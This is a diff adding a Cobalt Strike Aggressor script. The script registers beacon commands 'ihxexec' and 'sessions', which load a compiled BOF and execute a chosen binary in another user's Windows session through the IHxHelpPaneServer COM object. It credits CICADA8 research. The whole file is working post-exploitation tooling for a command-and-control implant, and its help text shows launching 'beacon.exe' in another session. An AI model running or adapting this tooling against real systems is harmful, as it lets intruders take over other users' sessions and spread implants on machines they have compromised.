@@ -1,0 +1,90 @@
+#
+# IHxExec BOF - Cobalt Strike Aggressor Script
+# Cross-Session Execution via IHxHelpPaneServer COM Object
+#
+# Original research: CICADA8 (https://github.com/CICADA8-Research/IHxExec)
+#
+
+alias ihxexec {
+    local('$bid $session $executable $barch $handle $data $args');
+
+    $bid = $1;
+    $session = $2;
+    $executable = $3;
+
+    # Validate arguments
+    if ($session eq "" || $executable eq "") {
+        berror($bid, "Usage: ihxexec <session_id> <executable_path>");
+        berror($bid, "Example: ihxexec 1 C:\\Windows\\System32\\calc.exe");
+        return;
+    }
+
+    # Validate session is a number
+    if (!-isnumber $session) {
+        berror($bid, "Session ID must be a number");
+        return;
+    }
+
+    # Get beacon architecture
+    $barch = barch($bid);
+
+    # Only x64 supported
+    if ($barch ne "x64") {
+        berror($bid, "Only x64 beacons supported");
+        return;
+    }
+
+    # Load BOF
+    $handle = openf(script_resource("bofs/IHxExec.x64.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($data) == 0) {
+        berror($bid, "Failed to load BOF file");
+        return;
+    }
+
+    # Pack arguments: session_id (string) + executable_path (string)
+    $args = bof_pack($bid, "zz", $session, $executable);
+
+    # Log
+    btask($bid, "IHxExec: Executing $executable in session $session");
+
+    # Execute BOF
+    beacon_inline_execute($bid, $data, "go", $args);
+}
+
+beacon_command_register(
+    "ihxexec",
+    "Execute binary in another user's session via IHxHelpPaneServer COM",
+    "
+IHxExec BOF - Cross-Session Execution via COM
+----------------------------------------------
+Execute binaries in another user's session without process injection.
+Uses IHxHelpPaneServer COM object with cross-session activation.
+
+Usage: ihxexec <session_id> <executable_path>
+
+Examples:
+    ihxexec 1 C:\\Windows\\System32\\calc.exe
+    ihxexec 2 C:\\Users\\Public\\beacon.exe
+
+Requirements:
+    - Elevated privileges (Admin/SYSTEM)
+    - Target session must be active
+    - x64 beacon only
+
+Credits: CICADA8 - https://github.com/CICADA8-Research/IHxExec
+"
+);
+
+# Helper to list sessions
+alias sessions {
+    bshell($1, "query session");
+}
+
+beacon_command_register(
+    "sessions",
+    "List active Windows sessions",
+    "Lists all active Windows sessions. Use the ID for ihxexec."
+);
